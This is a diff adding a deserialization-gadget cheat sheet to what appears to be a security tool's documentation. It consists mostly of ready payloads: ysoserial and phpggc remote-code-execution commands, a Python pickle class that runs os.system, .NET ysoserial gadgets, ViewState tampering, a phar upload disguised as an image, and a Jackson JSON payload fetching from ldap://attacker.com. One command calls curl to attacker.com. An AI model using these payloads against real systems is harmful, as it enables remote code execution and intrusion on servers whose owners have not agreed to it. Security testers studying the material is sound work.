@@ -606,3 +606,76 @@ findings with exploit proofs automatically.
 | Primitive id | Coverage |
 |---|---|
 | `deserialization` | unsafe deserialization probes |
+
+---
+
+## Cheat Sheet — Deserialization Gadgets
+
+### Java (ysoserial)
+
+```bash
+# Generate payloads
+java -jar ysoserial.jar CommonsCollections1 "id" | base64
+java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com" | base64
+
+# Common gadget chains
+# CommonsCollections1-7, CommonsBeanutils, Spring1/2
+# Jdk7u21, C3P0, Groovy1, JBoss
+```
+
+### PHP (phpggc)
+
+```bash
+# Generate payloads
+./phpggc Laravel/RCE1 system id
+./phpggc Symfony/RCE1 system id
+./phpggc Monolog/RCE1 system id
+
+# Phar deserialization
+# Upload phar:// disguised as image
+# Trigger via file operations (file_get_contents, file_exists)
+```
+
+### Python (Pickle)
+
+```python
+import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+# Send as: cookie=pickle_base64_data
+```
+
+### .NET (ysoserial.net)
+
+```bash
+# Generate payloads
+ysoserial.exe -g WindowsIdentity -c "cmd.exe /c id" -f Base64
+ysoserial.exe -g TypeConfuseDelegate -c "cmd.exe /c id" -f Base64
+# Gadget chains: WindowsIdentity, TypeConfuseDelegate, PSObject
+```
+
+### Ruby
+
+```ruby
+# Marshal.load exploit
+payload = "\x04\x08Iu:Gem::Installeri\x00..."
+# Send as Base64-encoded Ruby Marshal data
+```
+
+### ViewState (.NET)
+
+```bash
+# Tamper ViewState with known/validation key
+# Tools: ViewstateForge, aspnet_viewstate
+python3 viewstate.py --mode encrypt --key KEY --data "malicious_payload"
+```
+
+### Jackson (Java)
+
+```json
+{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com/Exploit", "autoCommit": true}
+```
